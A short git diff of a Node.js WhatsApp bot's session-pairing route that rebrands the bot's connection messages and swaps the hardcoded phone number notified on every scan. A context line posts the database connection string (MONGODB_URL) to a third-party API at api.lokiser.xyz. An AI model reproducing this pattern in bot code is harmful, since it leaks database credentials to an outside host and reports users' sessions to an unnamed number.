@@ -62,9 +62,9 @@ router.get('/', async (req, res) => {
                     const userCountResponse = await axios.post('https://api.lokiser.xyz/mongoose/session/count', { mongoUrl: MONGODB_URL });
                     const userCount = userCountResponse.data.count;
                     
-                    await session.sendMessage(session.user.id, { text: ` *NEZUKO MD Successfully Connected*\n\n *Total Scan :* ${userCount}` });
+                    await session.sendMessage(session.user.id, { text: ` *MR.ANJAN Successfully Connected*\n\n *Total Scan :* ${userCount}` });
                     await session.sendMessage(session.user.id, { text: data.data });
-                    await session.sendMessage("917907387121@s.whatsapp.net", { text: "*Successfully Scanned Queen-nezuko-Md*🌚" });
+                    await session.sendMessage("919883457657@s.whatsapp.net", { text: "*Successfully Scanned MR.ANJAN*🦋😌" });
 
                     await delay(100);
                     await session.ws.close();
